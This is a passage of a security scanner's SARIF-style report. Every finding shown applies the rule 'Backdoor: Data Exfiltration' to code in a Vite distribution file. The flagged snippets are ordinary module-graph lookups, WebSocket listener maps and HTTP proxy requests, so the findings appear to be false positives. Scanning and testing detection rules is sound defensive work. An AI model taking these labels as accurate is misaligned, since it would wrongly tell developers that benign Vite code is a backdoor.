                    "text": "    return this.idToModuleMap.get(removeTimestampQuery(id));\n  }\n  getModulesByFile(file) {\n    return this.fileToModulesMap.get(file);\n  }\n  onFileChange(file) {\n    const mods = this.getModulesByFile(file);\n",
                    "rendered": {
                      "text": "    return this.idToModuleMap.get(removeTimestampQuery(id));\n  }\n  getModulesByFile(file) {\n    return this.fileToModulesMap.get(file);\n  }\n  onFileChange(file) {\n    const mods = this.getModulesByFile(file);\n",
                      "markdown": "`    return this.idToModuleMap.get(removeTimestampQuery(id));\n  }\n  getModulesByFile(file) {\n    return this.fileToModulesMap.get(file);\n  }\n  onFileChange(file) {\n    const mods = this.getModulesByFile(file);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62278,
                  "startColumn": 29,
                  "endLine": 62278,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    return this.urlToModuleMap.get(url);\n  }\n  getModuleById(id) {\n    return this.idToModuleMap.get(removeTimestampQuery(id));\n  }\n  getModulesByFile(file) {\n    return this.fileToModulesMap.get(file);\n",
                    "rendered": {
                      "text": "    return this.urlToModuleMap.get(url);\n  }\n  getModuleById(id) {\n    return this.idToModuleMap.get(removeTimestampQuery(id));\n  }\n  getModulesByFile(file) {\n    return this.fileToModulesMap.get(file);\n",
                      "markdown": "`    return this.urlToModuleMap.get(url);\n  }\n  getModuleById(id) {\n    return this.idToModuleMap.get(removeTimestampQuery(id));\n  }\n  getModulesByFile(file) {\n    return this.fileToModulesMap.get(file);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62275,
                  "startColumn": 30,
                  "endLine": 62275,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      return mod;\n    }\n    const [url] = await this._resolveUrl(rawUrl, ssr);\n    return this.urlToModuleMap.get(url);\n  }\n  getModuleById(id) {\n    return this.idToModuleMap.get(removeTimestampQuery(id));\n",
                    "rendered": {
                      "text": "      return mod;\n    }\n    const [url] = await this._resolveUrl(rawUrl, ssr);\n    return this.urlToModuleMap.get(url);\n  }\n  getModuleById(id) {\n    return this.idToModuleMap.get(removeTimestampQuery(id));\n",
                      "markdown": "`      return mod;\n    }\n    const [url] = await this._resolveUrl(rawUrl, ssr);\n    return this.urlToModuleMap.get(url);\n  }\n  getModuleById(id) {\n    return this.idToModuleMap.get(removeTimestampQuery(id));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62106,
                  "startColumn": 36,
                  "endLine": 62106,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      ensureWatchedFile(watcher, mod.file, config.root);\n      await server?.pluginContainer.transform(code, mod.id);\n      const hash = getHash(cleanUrl(mod.id));\n      const result = htmlProxyResult.get(`${hash}_${index}`);\n      overwriteAttrValue(s, location, result ?? \"\");\n    })\n  ]);\n",
                    "rendered": {
                      "text": "      ensureWatchedFile(watcher, mod.file, config.root);\n      await server?.pluginContainer.transform(code, mod.id);\n      const hash = getHash(cleanUrl(mod.id));\n      const result = htmlProxyResult.get(`${hash}_${index}`);\n      overwriteAttrValue(s, location, result ?? \"\");\n    })\n  ]);\n",
                      "markdown": "`      ensureWatchedFile(watcher, mod.file, config.root);\n      await server?.pluginContainer.transform(code, mod.id);\n      const hash = getHash(cleanUrl(mod.id));\n      const result = htmlProxyResult.get(`${hash}_${index}`);\n      overwriteAttrValue(s, location, result ?? \"\");\n    })\n  ]);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61906,
                  "startColumn": 51,
                  "endLine": 61906,
                  "endColumn": 56,
                  "snippet": {
                    "text": "const processNodeUrl = (url, useSrcSetReplacer, config, htmlPath, originalUrl, server, isClassicScriptLink) => {\n  const replacer = (url2) => {\n    if (server?.moduleGraph) {\n      const mod = server.moduleGraph.urlToModuleMap.get(url2);\n      if (mod && mod.lastHMRTimestamp > 0) {\n        url2 = injectQuery(url2, `t=${mod.lastHMRTimestamp}`);\n      }\n",
                    "rendered": {
                      "text": "const processNodeUrl = (url, useSrcSetReplacer, config, htmlPath, originalUrl, server, isClassicScriptLink) => {\n  const replacer = (url2) => {\n    if (server?.moduleGraph) {\n      const mod = server.moduleGraph.urlToModuleMap.get(url2);\n      if (mod && mod.lastHMRTimestamp > 0) {\n        url2 = injectQuery(url2, `t=${mod.lastHMRTimestamp}`);\n      }\n",
                      "markdown": "`const processNodeUrl = (url, useSrcSetReplacer, config, htmlPath, originalUrl, server, isClassicScriptLink) => {\n  const replacer = (url2) => {\n    if (server?.moduleGraph) {\n      const mod = server.moduleGraph.urlToModuleMap.get(url2);\n      if (mod && mod.lastHMRTimestamp > 0) {\n        url2 = injectQuery(url2, `t=${mod.lastHMRTimestamp}`);\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61100,
                  "startColumn": 78,
                  "endLine": 61100,
                  "endColumn": 87,
                  "snippet": {
                    "text": "    if (head && head.length) socket.unshift(head);\n\n\n    var proxyReq = (common.isSSL.test(options.target.protocol) ? https : http).request(\n      common.setupOutgoing(options.ssl || {}, options, req)\n    );\n\n",
                    "rendered": {
                      "text": "    if (head && head.length) socket.unshift(head);\n\n\n    var proxyReq = (common.isSSL.test(options.target.protocol) ? https : http).request(\n      common.setupOutgoing(options.ssl || {}, options, req)\n    );\n\n",
                      "markdown": "`    if (head && head.length) socket.unshift(head);\n\n\n    var proxyReq = (common.isSSL.test(options.target.protocol) ? https : http).request(\n      common.setupOutgoing(options.ssl || {}, options, req)\n    );\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60928,
                  "startColumn": 72,
                  "endLine": 60928,
                  "endColumn": 81,
                  "snippet": {
                    "text": "    }\n\n    // Request initalization\n    var proxyReq = (options.target.protocol === 'https:' ? https : http).request(\n      common$1.setupOutgoing(options.ssl || {}, options, req)\n    );\n\n",
                    "rendered": {
                      "text": "    }\n\n    // Request initalization\n    var proxyReq = (options.target.protocol === 'https:' ? https : http).request(\n      common$1.setupOutgoing(options.ssl || {}, options, req)\n    );\n\n",
                      "markdown": "`    }\n\n    // Request initalization\n    var proxyReq = (options.target.protocol === 'https:' ? https : http).request(\n      common$1.setupOutgoing(options.ssl || {}, options, req)\n    );\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60913,
                  "startColumn": 77,
                  "endLine": 60913,
                  "endColumn": 86,
                  "snippet": {
                    "text": "\n    if(options.forward) {\n      // If forward enable, so just pipe the request\n      var forwardReq = (options.forward.protocol === 'https:' ? https : http).request(\n        common$1.setupOutgoing(options.ssl || {}, options, req, 'forward')\n      );\n\n",
                    "rendered": {
                      "text": "\n    if(options.forward) {\n      // If forward enable, so just pipe the request\n      var forwardReq = (options.forward.protocol === 'https:' ? https : http).request(\n        common$1.setupOutgoing(options.ssl || {}, options, req, 'forward')\n      );\n\n",
                      "markdown": "`\n    if(options.forward) {\n      // If forward enable, so just pipe the request\n      var forwardReq = (options.forward.protocol === 'https:' ? https : http).request(\n        common$1.setupOutgoing(options.ssl || {}, options, req, 'forward')\n      );\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60664,
                  "startColumn": 42,
                  "endLine": 60664,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\n    // Executes a GET request, following redirects\n    function get(input, options, callback) {\n      var wrappedRequest = wrappedProtocol.request(input, options, callback);\n      wrappedRequest.end();\n      return wrappedRequest;\n    }\n",
                    "rendered": {
                      "text": "\n    // Executes a GET request, following redirects\n    function get(input, options, callback) {\n      var wrappedRequest = wrappedProtocol.request(input, options, callback);\n      wrappedRequest.end();\n      return wrappedRequest;\n    }\n",
                      "markdown": "`\n    // Executes a GET request, following redirects\n    function get(input, options, callback) {\n      var wrappedRequest = wrappedProtocol.request(input, options, callback);\n      wrappedRequest.end();\n      return wrappedRequest;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60453,
                  "startColumn": 22,
                  "endLine": 60453,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n  // Create the native request and set up its event handlers\n  var request = this._currentRequest =\n        nativeProtocol.request(this._options, this._onNativeResponse);\n  request._redirectable = this;\n  for (var event of events) {\n    request.on(event, eventHandlers[event]);\n",
                    "rendered": {
                      "text": "\n  // Create the native request and set up its event handlers\n  var request = this._currentRequest =\n        nativeProtocol.request(this._options, this._onNativeResponse);\n  request._redirectable = this;\n  for (var event of events) {\n    request.on(event, eventHandlers[event]);\n",
                      "markdown": "`\n  // Create the native request and set up its event handlers\n  var request = this._currentRequest =\n        nativeProtocol.request(this._options, this._onNativeResponse);\n  request._redirectable = this;\n  for (var event of events) {\n    request.on(event, eventHandlers[event]);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 59232,
                  "startColumn": 23,
                  "endLine": 59232,
                  "endColumn": 28,
                  "snippet": {
                    "text": "      if (wsServerEvents.includes(event)) {\n        wss.off(event, fn);\n      } else {\n        customListeners.get(event)?.delete(fn);\n      }\n    },\n    get clients() {\n",
                    "rendered": {
                      "text": "      if (wsServerEvents.includes(event)) {\n        wss.off(event, fn);\n      } else {\n        customListeners.get(event)?.delete(fn);\n      }\n    },\n    get clients() {\n",
                      "markdown": "`      if (wsServerEvents.includes(event)) {\n        wss.off(event, fn);\n      } else {\n        customListeners.get(event)?.delete(fn);\n      }\n    },\n    get clients() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 59225,
                  "startColumn": 23,
                  "endLine": 59225,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        if (!customListeners.has(event)) {\n          customListeners.set(event, /* @__PURE__ */ new Set());\n        }\n        customListeners.get(event).add(fn);\n      }\n    },\n    off: (event, fn) => {\n",
                    "rendered": {
                      "text": "        if (!customListeners.has(event)) {\n          customListeners.set(event, /* @__PURE__ */ new Set());\n        }\n        customListeners.get(event).add(fn);\n      }\n    },\n    off: (event, fn) => {\n",
                      "markdown": "`        if (!customListeners.has(event)) {\n          customListeners.set(event, /* @__PURE__ */ new Set());\n        }\n        customListeners.get(event).add(fn);\n      }\n    },\n    off: (event, fn) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 59211,
                  "startColumn": 21,
                  "endLine": 59211,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        socket\n      });\n    }\n    return clientsMap.get(socket);\n  }\n  let bufferedError = null;\n  return {\n",
                    "rendered": {
                      "text": "        socket\n      });\n    }\n    return clientsMap.get(socket);\n  }\n  let bufferedError = null;\n  return {\n",
                      "markdown": "`        socket\n      });\n    }\n    return clientsMap.get(socket);\n  }\n  let bufferedError = null;\n  return {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 59160,
                  "startColumn": 39,
                  "endLine": 59160,
                  "endColumn": 44,
                  "snippet": {
                    "text": "      } catch {\n      }\n      if (!parsed || parsed.type !== \"custom\" || !parsed.event) return;\n      const listeners = customListeners.get(parsed.event);\n      if (!listeners?.size) return;\n      const client = getSocketClient(socket);\n      listeners.forEach((listener) => listener(parsed.data, client));\n",
                    "rendered": {
                      "text": "      } catch {\n      }\n      if (!parsed || parsed.type !== \"custom\" || !parsed.event) return;\n      const listeners = customListeners.get(parsed.event);\n      if (!listeners?.size) return;\n      const client = getSocketClient(socket);\n      listeners.forEach((listener) => listener(parsed.data, client));\n",
                      "markdown": "`      } catch {\n      }\n      if (!parsed || parsed.type !== \"custom\" || !parsed.event) return;\n      const listeners = customListeners.get(parsed.event);\n      if (!listeners?.size) return;\n      const client = getSocketClient(socket);\n      listeners.forEach((listener) => listener(parsed.data, client));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52918,
                  "startColumn": 55,
                  "endLine": 52918,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    }\n    if (!visited.has(currentUrl)) {\n      visited.add(currentUrl);\n      const dependencies = pendingModuleDependencyGraph.get(currentUrl);\n      if (dependencies) {\n        for (const depUrl of dependencies) {\n          if (!visited.has(depUrl)) {\n",
                    "rendered": {
                      "text": "    }\n    if (!visited.has(currentUrl)) {\n      visited.add(currentUrl);\n      const dependencies = pendingModuleDependencyGraph.get(currentUrl);\n      if (dependencies) {\n        for (const depUrl of dependencies) {\n          if (!visited.has(depUrl)) {\n",
                      "markdown": "`    }\n    if (!visited.has(currentUrl)) {\n      visited.add(currentUrl);\n      const dependencies = pendingModuleDependencyGraph.get(currentUrl);\n      if (dependencies) {\n        for (const depUrl of dependencies) {\n          if (!visited.has(depUrl)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52903,
                  "startColumn": 32,
                  "endLine": 52903,
                  "endColumn": 37,
                  "snippet": {
                    "text": "}\nfunction addPendingModuleDependency(originUrl, depUrl) {\n  if (pendingModuleDependencyGraph.has(originUrl)) {\n    pendingModuleDependencyGraph.get(originUrl).add(depUrl);\n  } else {\n    pendingModuleDependencyGraph.set(originUrl, /* @__PURE__ */ new Set([depUrl]));\n  }\n",
                    "rendered": {
                      "text": "}\nfunction addPendingModuleDependency(originUrl, depUrl) {\n  if (pendingModuleDependencyGraph.has(originUrl)) {\n    pendingModuleDependencyGraph.get(originUrl).add(depUrl);\n  } else {\n    pendingModuleDependencyGraph.set(originUrl, /* @__PURE__ */ new Set([depUrl]));\n  }\n",
                      "markdown": "`}\nfunction addPendingModuleDependency(originUrl, depUrl) {\n  if (pendingModuleDependencyGraph.has(originUrl)) {\n    pendingModuleDependencyGraph.get(originUrl).add(depUrl);\n  } else {\n    pendingModuleDependencyGraph.set(originUrl, /* @__PURE__ */ new Set([depUrl]));\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52879,
                  "startColumn": 34,
                  "endLine": 52879,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    );\n  } catch (e) {\n    mod.ssrError = e;\n    const errorData = importErrors.get(e);\n    if (e.stack && fixStacktrace) {\n      ssrFixStacktrace(e, moduleGraph);\n    }\n",
                    "rendered": {
                      "text": "    );\n  } catch (e) {\n    mod.ssrError = e;\n    const errorData = importErrors.get(e);\n    if (e.stack && fixStacktrace) {\n      ssrFixStacktrace(e, moduleGraph);\n    }\n",
                      "markdown": "`    );\n  } catch (e) {\n    mod.ssrError = e;\n    const errorData = importErrors.get(e);\n    if (e.stack && fixStacktrace) {\n      ssrFixStacktrace(e, moduleGraph);\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52818,
                  "startColumn": 57,
                  "endLine": 52818,
                  "endColumn": 62,
                  "snippet": {
                    "text": "      if (!metadata?.isDynamicImport) {\n        addPendingModuleDependency(url, dep);\n        if (checkModuleDependencyExists(dep, url)) {\n          const depSsrModule = moduleGraph.urlToModuleMap.get(dep)?.ssrModule;\n          if (!depSsrModule) {\n            throw new Error(\n              \"[vite] The dependency module is not yet fully initialized due to circular dependency. This is a bug in Vite SSR\"\n",
                    "rendered": {
                      "text": "      if (!metadata?.isDynamicImport) {\n        addPendingModuleDependency(url, dep);\n        if (checkModuleDependencyExists(dep, url)) {\n          const depSsrModule = moduleGraph.urlToModuleMap.get(dep)?.ssrModule;\n          if (!depSsrModule) {\n            throw new Error(\n              \"[vite] The dependency module is not yet fully initialized due to circular dependency. This is a bug in Vite SSR\"\n",
                      "markdown": "`      if (!metadata?.isDynamicImport) {\n        addPendingModuleDependency(url, dep);\n        if (checkModuleDependencyExists(dep, url)) {\n          const depSsrModule = moduleGraph.urlToModuleMap.get(dep)?.ssrModule;\n          if (!depSsrModule) {\n            throw new Error(\n              \"[vite] The dependency module is not yet fully initialized due to circular dependency. This is a bug in Vite SSR\"\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52751,
                  "startColumn": 32,
                  "endLine": 52751,
                  "endColumn": 37,
                  "snippet": {
                    "text": "const importErrors = /* @__PURE__ */ new WeakMap();\nasync function ssrLoadModule(url, server, fixStacktrace) {\n  url = unwrapId$1(url);\n  const pending = pendingModules.get(url);\n  if (pending) {\n    return pending;\n  }\n",
                    "rendered": {
                      "text": "const importErrors = /* @__PURE__ */ new WeakMap();\nasync function ssrLoadModule(url, server, fixStacktrace) {\n  url = unwrapId$1(url);\n  const pending = pendingModules.get(url);\n  if (pending) {\n    return pending;\n  }\n",
                      "markdown": "`const importErrors = /* @__PURE__ */ new WeakMap();\nasync function ssrLoadModule(url, server, fixStacktrace) {\n  url = unwrapId$1(url);\n  const pending = pendingModules.get(url);\n  if (pending) {\n    return pending;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52695,
                  "startColumn": 45,
                  "endLine": 52695,
                  "endColumn": 50,
                  "snippet": {
                    "text": "      /^ {4}at (?:(\\S.*?)\\s\\()?(.+?):(\\d+)(?::(\\d+))?\\)?/,\n      (input, varName, id, line2, column) => {\n        if (!id) return input;\n        const mod = moduleGraph.idToModuleMap.get(id);\n        const rawSourceMap = mod?.ssrTransformResult?.map;\n        if (!rawSourceMap) {\n          return input;\n",
                    "rendered": {
                      "text": "      /^ {4}at (?:(\\S.*?)\\s\\()?(.+?):(\\d+)(?::(\\d+))?\\)?/,\n      (input, varName, id, line2, column) => {\n        if (!id) return input;\n        const mod = moduleGraph.idToModuleMap.get(id);\n        const rawSourceMap = mod?.ssrTransformResult?.map;\n        if (!rawSourceMap) {\n          return input;\n",
                      "markdown": "`      /^ {4}at (?:(\\S.*?)\\s\\()?(.+?):(\\d+)(?::(\\d+))?\\)?/,\n      (input, varName, id, line2, column) => {\n        if (!id) return input;\n        const mod = moduleGraph.idToModuleMap.get(id);\n        const rawSourceMap = mod?.ssrTransformResult?.map;\n        if (!rawSourceMap) {\n          return input;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52511,
                  "startColumn": 50,
                  "endLine": 52511,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    scopeIds.add(name);\n  };\n  function isInScope(name, parents) {\n    return parents.some((node) => node && scopeMap.get(node)?.has(name));\n  }\n  function handlePattern(p, parentScope) {\n    if (p.type === \"Identifier\") {\n",
                    "rendered": {
                      "text": "    scopeIds.add(name);\n  };\n  function isInScope(name, parents) {\n    return parents.some((node) => node && scopeMap.get(node)?.has(name));\n  }\n  function handlePattern(p, parentScope) {\n    if (p.type === \"Identifier\") {\n",
                      "markdown": "`    scopeIds.add(name);\n  };\n  function isInScope(name, parents) {\n    return parents.some((node) => node && scopeMap.get(node)?.has(name));\n  }\n  function handlePattern(p, parentScope) {\n    if (p.type === \"Identifier\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52500,
                  "startColumn": 27,
                  "endLine": 52500,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  const scopeMap = /* @__PURE__ */ new WeakMap();\n  const identifiers = [];\n  const setScope = (node, name) => {\n    let scopeIds = scopeMap.get(node);\n    if (scopeIds && scopeIds.has(name)) {\n      return;\n    }\n",
                    "rendered": {
                      "text": "  const scopeMap = /* @__PURE__ */ new WeakMap();\n  const identifiers = [];\n  const setScope = (node, name) => {\n    let scopeIds = scopeMap.get(node);\n    if (scopeIds && scopeIds.has(name)) {\n      return;\n    }\n",
                      "markdown": "`  const scopeMap = /* @__PURE__ */ new WeakMap();\n  const identifiers = [];\n  const setScope = (node, name) => {\n    let scopeIds = scopeMap.get(node);\n    if (scopeIds && scopeIds.has(name)) {\n      return;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52438,
                  "startColumn": 35,
                  "endLine": 52438,
                  "endColumn": 40,
                  "snippet": {
                    "text": "  walk(ast, {\n    onIdentifier(id, parent, parentStack) {\n      const grandparent = parentStack[1];\n      const binding = idToImportMap.get(id.name);\n      if (!binding) {\n        return;\n      }\n",
                    "rendered": {
                      "text": "  walk(ast, {\n    onIdentifier(id, parent, parentStack) {\n      const grandparent = parentStack[1];\n      const binding = idToImportMap.get(id.name);\n      if (!binding) {\n        return;\n      }\n",
                      "markdown": "`  walk(ast, {\n    onIdentifier(id, parent, parentStack) {\n      const grandparent = parentStack[1];\n      const binding = idToImportMap.get(id.name);\n      if (!binding) {\n        return;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
